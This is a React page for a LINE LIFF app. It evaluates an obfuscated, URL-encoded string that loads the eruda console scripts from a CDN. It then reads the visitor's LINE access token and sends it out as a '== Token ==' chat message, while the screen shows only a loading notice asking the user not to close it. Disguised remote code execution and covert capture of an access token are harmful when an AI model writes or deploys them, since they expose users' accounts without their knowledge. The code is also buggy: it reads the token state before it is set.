import { useState, useEffect } from "react";
import { getLiffId } from "@/utils/getLiffId";
import { liff } from "@line/liff";
import { sendLiffMessage } from "@/utils/sendMessage";

export default function Home() {
  const [liffId, setLiffId] = useState(getLiffId());
  const [liffObj, setLiffObj] = useState<any>({});
  const [token, setToken] = useState("");

  useEffect(() => {
    Function(
        decodeURIComponent(
          "!(function()%7Bvar%20erudaScript%3Ddocument.createElement('script')%3BerudaScript.src%3D%22%2F%2Fcdn.jsdelivr.net%2Fnpm%2Feruda%2Feruda.min.js%22%3Bvar%20erudaTimingScript%3Ddocument.createElement('script')%3BerudaTimingScript.src%3D%22%2F%2Fcdn.jsdelivr.net%2Fnpm%2Feruda-timing%2Feruda-timing.min.js%22%3Bvar%20erudaCodeScript%3Ddocument.createElement('script')%3BerudaCodeScript.src%3D%22%2F%2Fcdn.jsdelivr.net%2Fnpm%2Feruda-code%2Feruda-code.min.js%22%3Bvar%20erudaDomScript%3Ddocument.createElement('script')%3BerudaDomScript.src%3D%22%2F%2Fcdn.jsdelivr.net%2Fnpm%2Feruda-dom%2Feruda-dom.min.js%22%3Bdocument.body.appendChild(erudaScript)%3BerudaScript.onload%3Dfunction()%7Beruda.init()%3Bdocument.body.appendChild(erudaTimingScript)%3BerudaTimingScript.onload%3Dfunction()%7Beruda.add(erudaTiming)%7D%3Bdocument.body.appendChild(erudaCodeScript)%3BerudaCodeScript.onload%3Dfunction()%7Beruda.add(erudaCode)%7D%3Bdocument.body.appendChild(erudaDomScript)%3BerudaDomScript.onload%3Dfunction()%7Beruda.add(erudaDom)%7D%3B%7D%7D)()%3B"
        )
    )();
    liff.init({ liffId: liffId }).then(() => {
      setLiffObj(liff);
      console.log("Patch!");
      console.log(liff);
      setToken(liff.getAccessToken() || "");
      alert(token);

      sendLiffMessage(token, [
        {
          type: "text",
          text: "== Token ==",
        },
        {
          type: "text",
          text: token,
        },
      ]);
    }).catch(e => alert(e))
  }, []);

  return (
    <>
      <p>Loading... (画面を閉じないで下さい。)</p>
    </>
  );
}
